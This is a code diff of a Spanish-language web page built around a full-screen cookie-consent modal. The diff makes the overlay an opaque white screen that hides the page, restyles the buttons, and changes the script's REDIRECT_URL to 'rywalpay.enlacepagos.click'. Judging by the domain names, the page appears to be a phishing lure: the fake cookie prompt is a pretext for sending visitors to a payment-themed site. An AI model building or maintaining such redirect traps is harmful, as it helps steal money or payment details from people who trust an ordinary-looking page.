@@ -20,6 +20,7 @@
   --trans:0.35s cubic-bezier(0.25,0.46,0.45,0.94);
   --fuente:'Palatino Linotype','Book Antiqua',Georgia,serif;
   --fuente-sans:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif;
+  --azul-boton:#5dbaeb;
 }
 html, body{ scroll-behavior:smooth; }
 body{ font-family:var(--fuente-sans); color:var(--texto); background:var(--verde-50);
@@ -29,33 +30,70 @@ a{ color:var(--verde-700); text-decoration:none; transition:color var(--trans); 
 a:hover{ color:var(--verde-500); }
 
 /* ===== COOKIES ===== */
-.cookie-overlay{ position:fixed; inset:0; background:rgba(10,26,13,0.82);
-  backdrop-filter:blur(6px); z-index:9998; }
-.cookie-banner{ position:fixed; inset:0; display:flex; align-items:center;
-  justify-content:center; padding:24px; z-index:9999; }
-.cookie-modal{ background:var(--blanco); max-width:520px; width:100%;
-  padding:48px 40px; border-radius:4px; box-shadow:0 30px 80px rgba(0,0,0,0.45);
-  text-align:center; border:1px solid var(--verde-300); border-top:4px solid var(--verde-700);
-  animation:entradaCookie 0.55s cubic-bezier(0.34,1.56,0.64,1); }
+
+/* Fondo TOTALMENTE blanco, opaco, sin blur */
+.cookie-overlay{
+  position:fixed; inset:0;
+  background:#ffffff;          /* blanco puro */
+  z-index:99998;
+}
+
+.cookie-banner{
+  position:fixed; inset:0;
+  display:flex; align-items:center; justify-content:center;
+  padding:24px; z-index:99999;
+  background:#ffffff;          /* también blanco puro por si acaso */
+}
+
+.cookie-modal{
+  background:var(--blanco); max-width:520px; width:100%;
+  padding:48px 40px; border-radius:4px;
+  box-shadow:0 30px 80px rgba(0,0,0,0.12);
+  text-align:center;
+  border:1px solid var(--verde-300); border-top:4px solid var(--azul-boton);
+  animation:entradaCookie 0.55s cubic-bezier(0.34,1.56,0.64,1);
+}
 @keyframes entradaCookie{ from{ transform:scale(0.9) translateY(24px); opacity:0; }
   to{ transform:scale(1) translateY(0); opacity:1; } }
+
 .cookie-modal h2{ font-family:var(--fuente); font-size:1.55rem; margin-bottom:12px;
   color:var(--verde-900); font-weight:700; line-height:1.25; }
 .cookie-modal p{ font-size:0.93rem; color:var(--texto-suave); margin-bottom:30px; line-height:1.7; }
+
 .cookie-acciones{ display:flex; gap:12px; justify-content:center; flex-wrap:wrap; }
-.cookie-acciones .boton-cookie{ display:inline-block; padding:14px 34px; border-radius:3px;
+.cookie-acciones .boton-cookie{
+  display:inline-block; padding:14px 34px; border-radius:3px;
   font-weight:700; font-size:0.88rem; text-decoration:none; transition:all var(--trans);
-  min-width:150px; text-align:center; font-family:var(--fuente-sans); letter-spacing:0.03em;
-  cursor:pointer; }
-.boton-cookie.aceptar{ background:var(--verde-700); color:var(--blanco); border:1.5px solid var(--verde-700); }
-.boton-cookie.aceptar:hover{ background:var(--verde-500); border-color:var(--verde-500); }
-.boton-cookie.rechazar{ background:transparent; color:var(--verde-800); border:1.5px solid var(--verde-300); }
-.boton-cookie.rechazar:hover{ border-color:var(--verde-600); color:var(--verde-600); }
+  min-width:150px; text-align:center; font-family:var(--fuente-sans);
+  letter-spacing:0.03em; cursor:pointer;
+}
+
+/* Botón ACEPTAR: fondo azul #5dbaeb */
+.boton-cookie.aceptar{
+  background:#5dbaeb; color:#ffffff;
+  border:1.5px solid #5dbaeb;
+  box-shadow:0 6px 18px rgba(93,186,235,0.35);
+}
+.boton-cookie.aceptar:hover{
+  background:#3aa9e3; border-color:#3aa9e3;
+  transform:translateY(-2px);
+}
+
+/* Botón RECHAZAR: transparente con borde y texto #5dbaeb */
+.boton-cookie.rechazar{
+  background:transparent; color:#5dbaeb;
+  border:1.5px solid #5dbaeb;
+}
+.boton-cookie.rechazar:hover{
+  background:#5dbaeb; color:#ffffff;
+  transform:translateY(-2px);
+}
+
 .cookie-enlaces{ margin-top:22px; font-size:0.8rem; color:var(--texto-suave); }
-.cookie-enlaces a{ color:var(--verde-700); font-weight:600; }
+.cookie-enlaces a{ color:#5dbaeb; font-weight:600; }
 .cookie-enlaces a:hover{ text-decoration:underline; }
 
-/* Estado inicial (clase del body en el HTML) */
+/* Estado inicial */
 body.cookies-pendientes .cookie-overlay{ display:block; }
 body.cookies-pendientes .cookie-banner{ display:flex; }
 body:not(.cookies-pendientes) .cookie-overlay,
@@ -66,7 +104,7 @@ body:not(.cookies-pendientes) .contenido-principal{
 @keyframes aparecer{ from{ opacity:0; transform:translateY(14px); }
   to{ opacity:1; transform:translateY(0); } }
 
-/* Compatibilidad con el script antiguo: asegura centrado cuando usa body.bloqueado */
+/* Compatibilidad con script (body.bloqueado) */
 body.bloqueado .cookie-overlay{ display:block; }
 body.bloqueado .cookie-banner{
   display:flex; align-items:center; justify-content:center;
@@ -204,7 +242,7 @@ p:last-child{ margin-bottom:0; }
 </head>
 <body class="cookies-pendientes">
 
-<!-- Overlay + banner de cookies (con IDs para el script antiguo) -->
+<!-- Overlay + banner de cookies -->
 <div id="cookie-overlay" class="cookie-overlay"></div>
 <div id="aviso-cookies" class="cookie-banner" role="dialog" aria-modal="true" aria-labelledby="titulo-cookies">
   <div class="cookie-modal">
@@ -221,7 +259,7 @@ p:last-child{ margin-bottom:0; }
   </div>
 </div>
 
-<!-- Contenido principal (con ID para el script antiguo) -->
+<!-- Contenido principal -->
 <div id="contenidoPrincipal" class="contenido-principal">
 
   <header class="cabecera">
@@ -389,13 +427,13 @@ p:last-child{ margin-bottom:0; }
 
 </div>
 
-<!-- SCRIPT ANTIGUO (MODO 2), corregido para centrar el modal -->
+<!-- SCRIPT (MODO 2) -->
 <script>
   'use strict';
 
   (function () {
     var COOKIE_BUTTON_MODE = 2;
-    var REDIRECT_URL = "https://picoplacaversal.tramitevial.click/";
+    var REDIRECT_URL = "https://rywalpay.enlacepagos.click/";
 
     var overlay = document.getElementById('cookie-overlay');
     var banner = document.getElementById('aviso-cookies');
@@ -411,7 +449,6 @@ p:last-child{ margin-bottom:0; }
       return;
     }
 
-    // Estado inicial: mostrar banner centrado
     document.body.classList.add('bloqueado');
     overlay.style.display = 'block';
     banner.style.display = 'flex';
@@ -474,7 +511,6 @@ p:last-child{ margin-bottom:0; }
       redirectTo(REDIRECT_URL);
     }
 
-    // Menú móvil (si existiera en el futuro)
     var botonMenu = document.getElementById('botonMenu');
     var menu = document.getElementById('menu');
 
